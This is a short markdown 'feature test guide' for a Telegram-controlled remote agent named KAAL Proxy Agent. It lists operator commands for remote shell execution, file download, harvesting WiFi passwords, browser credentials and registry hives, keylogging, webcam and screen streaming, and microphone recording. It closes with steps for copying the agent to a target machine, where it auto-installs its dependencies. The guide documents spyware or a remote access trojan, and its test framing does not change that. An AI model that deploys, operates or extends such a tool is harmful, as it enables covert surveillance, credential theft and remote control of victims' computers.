# KAAL Proxy Agent - Feature Test Guide

## ✅ Core Features (No Dependencies)

### 1. Shell Commands
```
/cmd exec whoami
/cmd exec hostname
/cmd exec ipconfig
```

### 2. File Operations
```
/cmd ls
/cmd ls C:\
/cmd ls Desktop
/cmd download file.txt
```

### 3. Credentials
```
/cmd creds
```
- WiFi passwords
- Browser credential locations
- Registry hive dumps (requires admin)

### 4. Screenshot (Works with ctypes fallback)
```
/cmd screenshot
```

### 5. Location
```
/cmd location
```

## 🔧 Advanced Features (Auto-Install on First Run)

### 6. Keylogger (Windows only)
```
/cmd keylog_start
/cmd keylog_dump
/cmd keylog_stop
```

### 7. Webcam
```
/cmd webcam_snap
/cmd webcam_switch
/cmd webcam_stream start
/cmd webcam_stream stop
```

### 8. Screen Streaming
```
/cmd screen_stream start
/cmd screen_stream stop
```

### 9. Audio Recording
```
/cmd microphone_record 5
```
(Records 5 seconds)

## 📋 Auto-Install

The agent will automatically install missing packages on first run:
- `pillow` (better screenshots)
- `mss` (faster screenshots)
- `opencv-python` (webcam)
- `pyaudio` (audio recording)

**Fallbacks if install fails:**
- Screenshot: Uses ctypes + Windows API
- Keylogger: Native Windows API (no package needed)
- Others: Show helpful error messages

## 🚀 Deployment Steps

1. Copy to VM:
   ```cmd
   copy test_agent_proxy.py "target_folder\"
   copy agent_core.py "target_folder\"
   ```

2. Run agent:
   ```cmd
   python test_agent_proxy.py
   ```

3. Agent auto-installs dependencies

4. Send commands via Telegram!
